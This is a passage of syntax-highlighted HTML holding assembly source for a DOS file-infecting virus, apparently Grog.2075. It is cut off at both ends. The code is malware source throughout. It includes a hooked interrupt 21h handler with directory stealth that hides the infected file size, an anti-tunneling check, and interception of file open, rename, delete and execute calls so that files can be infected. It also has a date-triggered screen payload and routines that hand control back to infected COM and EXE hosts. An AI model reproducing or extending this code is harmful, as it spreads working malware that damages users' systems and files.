         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">fcb_dont_ste</span><span class="sc0">    </span><span class="sc1">; Not infected? Jump to fcb_dont_ste</span><span class="sc0">

         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1dh</span><span class="sc4">],(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">fcb_dont_ste</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">        </span><span class="sc1">; Load registers from stack</span><span class="sc0">
</span><span class="sc5">fcb_ste_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">iret</span><span class="sc0">            </span><span class="sc1">; Interrupt return!</span><span class="sc0">
</span><span class="sc5">set_int21_st</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21_origin</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21_origin</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">

         </span><span class="sc6">popf</span><span class="sc0">            </span><span class="sc1">; Load flags from stack</span><span class="sc0">

         </span><span class="sc6">iret</span><span class="sc0">            </span><span class="sc1">; Interrupt return!</span><span class="sc0">
</span><span class="sc5">get_int21_st</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21_origin</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21_origin</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">

         </span><span class="sc6">popf</span><span class="sc0">            </span><span class="sc1">; Load flags from stack</span><span class="sc0">

         </span><span class="sc6">iret</span><span class="sc0">            </span><span class="sc1">; Interrupt return!</span><span class="sc0">
</span><span class="sc5">jmp_dta_ste</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">dta_stealth_</span><span class="sc0">
</span><span class="sc5">jmp_dta_ste_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">dta_stealth</span><span class="sc0">
</span><span class="sc5">jmp_fcb_ste</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">fcb_stealth_</span><span class="sc0">
</span><span class="sc5">jmp_fcb_ste_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">fcb_stealth</span><span class="sc0">

</span><span class="sc5">int21_virus</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Interrupt 21h of Grog.2075</span><span class="sc0">
         </span><span class="sc6">pushf</span><span class="sc0">           </span><span class="sc1">; Save flags at stack</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'Gg'</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack</span><span class="sc0">

         </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc0">          </span><span class="sc1">; Decrease SP</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc0">          </span><span class="sc1">; Decrease SP</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'Gg'</span><span class="sc0">             </span><span class="sc1">; Tunneling?</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">test_functio</span><span class="sc0">    </span><span class="sc1">; No tunneling? Jump to test_functio</span><span class="sc0">

         </span><span class="sc6">popf</span><span class="sc0">            </span><span class="sc1">; Load flags from stack</span><span class="sc0">

         </span><span class="sc6">iret</span><span class="sc0">            </span><span class="sc1">; Interrupt return!</span><span class="sc0">
</span><span class="sc5">test_functio</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc0">      </span><span class="sc1">; Find first matching file (DTA)?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">jmp_dta_ste_</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to jmp_dta_ste_</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc0">      </span><span class="sc1">; Find next matching file (DTA)?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">jmp_dta_ste</span><span class="sc0">     </span><span class="sc1">; Equal? Jump to jmp_dta_ste</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11h</span><span class="sc0">         </span><span class="sc1">; Find first matching file (DTA)?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">jmp_fcb_ste_</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to jmp_fcb_ste_</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12h</span><span class="sc0">         </span><span class="sc1">; Find next matching file (DTA)?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">jmp_fcb_ste</span><span class="sc0">     </span><span class="sc1">; Equal? Jump to jmp_fcb_ste</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2521h</span><span class="sc0">        </span><span class="sc1">; Set interrupt vector 21h?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">set_int21_st</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to set_int21_st</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3521h</span><span class="sc0">        </span><span class="sc1">; Get interrupt vector 21h?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">get_int21_st</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to get_int21_st</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4b47h</span><span class="sc0">        </span><span class="sc1">; Grog.2075 function?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">jmp_grog_fun</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to jmp_grog_fun</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">6c00h</span><span class="sc0">        </span><span class="sc1">; Extended open/create?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">tst_ext_open</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to tst_ext_open</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3dh</span><span class="sc0">      </span><span class="sc1">; Open file?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">tst_ext_open</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to tst_ext_open</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">56h</span><span class="sc0">      </span><span class="sc1">; Rename file?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">tst_ext_open</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to tst_ext_open</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">43h</span><span class="sc0">      </span><span class="sc1">; Get or set file attributes?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">tst_ext_open</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to tst_ext_open</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc0">      </span><span class="sc1">; Delete file?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">tst_ext_open</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to tst_ext_open</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4bh</span><span class="sc0">      </span><span class="sc1">; Load and/or execute program?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">tst_ext_open</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to tst_ext_open</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">int21_exit_</span><span class="sc0">
</span><span class="sc5">tst_ext_open</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

         </span><span class="sc6">cld</span><span class="sc0">             </span><span class="sc1">; Clear direction flag</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">6ch</span><span class="sc0">      </span><span class="sc1">; Extended open/create?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_ext_open</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to not_ext_open</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; DX = offset of filename</span><span class="sc0">
</span><span class="sc5">not_ext_open</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">       </span><span class="sc1">; Zero AL</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; BP = DOS function</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">       </span><span class="sc1">; SI = extra segment</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3524h</span><span class="sc0">        </span><span class="sc1">; Get interrupt vector 24h</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">       </span><span class="sc1">; Save registers at stack</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Save registers at stack</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">int24_virus</span><span class="sc0">  </span><span class="sc1">; DX = offset of int24_virus</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">        </span><span class="sc1">; Set interrupt vector 24h</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">prepare_exam</span><span class="sc0">
</span><span class="sc5">jmp_grog_fun</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">grog_functio</span><span class="sc0">
</span><span class="sc5">video_effect</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">        </span><span class="sc1">; Set interrupt vector 24h</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2ah</span><span class="sc0">      </span><span class="sc1">; Get system date</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">11h</span><span class="sc0">      </span><span class="sc1">; Produce video effect?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">int21_exit</span><span class="sc0">      </span><span class="sc1">; Not equal? Jump to int21_exit</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">      </span><span class="sc1">; AX = segment of BIOS data segment</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; DS =    "    "   "    "      "</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">17h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AL = keyboard status flag one</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01110000b</span><span class="sc0">    </span><span class="sc1">; Clear insert active, either alt ...</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01110000b</span><span class="sc0">    </span><span class="sc1">; Caps lock, num lock and scroll l...</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">int21_exit</span><span class="sc0">      </span><span class="sc1">; Not equal? Jump to int21_exit</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0b800h</span><span class="sc0">       </span><span class="sc1">; AX = segment of text video RAM</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; ES =    "    "   "     "    "</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">       </span><span class="sc1">; Zero DI</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">stdout_str</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc0">   </span><span class="sc1">; SI = offset of stdout_str + 01h</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc5">stdout_end</span><span class="sc0">   </span><span class="sc1">; BP = offset of stdout_end</span><span class="sc0">
</span><span class="sc5">sto_str_int3</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">movsb</span><span class="sc0">           </span><span class="sc1">; Move byte of stdout_str to text ...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0cch</span><span class="sc0">         </span><span class="sc1">; INT 03h (opcode 0cch)</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">           </span><span class="sc1">; Store INT 03h</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; End of stdout_str?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">sto_str_int3</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to sto_str_int3</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; Load BX from stack (CS)</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1ffeh</span><span class="sc0">        </span><span class="sc1">; Subtract eight thousand nine-hun...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2ch</span><span class="sc0">      </span><span class="sc1">; Get system time</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; Seconds below top of memory?</span><span class="sc0">
         </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">store_nop</span><span class="sc0">       </span><span class="sc1">; Below? Jump to store_nop</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">       </span><span class="sc1">; Zero DH</span><span class="sc0">
</span><span class="sc5">store_nop</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; Save DX at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Load ES from stack (DX)</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; DI = hour and minute</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">      </span><span class="sc1">; NOP (opcode 90h)</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">           </span><span class="sc1">; Store NOP</span><span class="sc0">
</span><span class="sc5">int21_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">int21_exit_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">popf</span><span class="sc0">            </span><span class="sc1">; Load flags from stack</span><span class="sc0">

         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0eah</span><span class="sc0">        </span><span class="sc1">; JMP imm32 (opcode 0eah)</span><span class="sc0">
</span><span class="sc5">int21_origin</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Address of interrupt 21h</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc5">grog_functio</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc12">'Gg'</span><span class="sc0">             </span><span class="sc1">; Grog.2075 function?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">int21_exit_</span><span class="sc0">     </span><span class="sc1">; Not equal? Jump to int21_exit_</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">        </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Save DS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Load ES from stack (DS)</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">com_or_exe</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">    </span><span class="sc1">; EXE executable?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">vir_exe_exit</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to vir_exe_exit</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc5">origin_off</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; SI = offset of original code of ...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">         </span><span class="sc1">; AX = offset of beginning of code</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; SI = offset of original code</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; DI = offset of beginning of code</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">)</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Save registers at stack</span><span class="sc0">
</span><span class="sc5">restore_loop</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">movsb</span><span class="sc0">           </span><span class="sc1">; Move the original code</span><span class="sc0">

         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">restore_loop</span><span class="sc0">
</span><span class="sc5">zero_regs</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Zero AX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Zero BX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Zero CX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Zero DX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Zero BP</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Zero SI</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Zero DI</span><span class="sc0">

         </span><span class="sc6">iret</span><span class="sc0">            </span><span class="sc1">; Interrupt return!</span><span class="sc0">
</span><span class="sc5">vir_exe_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">62h</span><span class="sc0">      </span><span class="sc1">; Get current PSP address</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">

         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">      </span><span class="sc1">; BX = segment of beginning of code</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_header</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_header</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack</span><span class="sc0">

         </span><span class="sc6">cli</span><span class="sc0">             </span><span class="sc1">; Clear interrupt-enable flag</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_header</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_header</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">sti</span><span class="sc0">             </span><span class="sc1">; Set interrupt-enable flag</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">
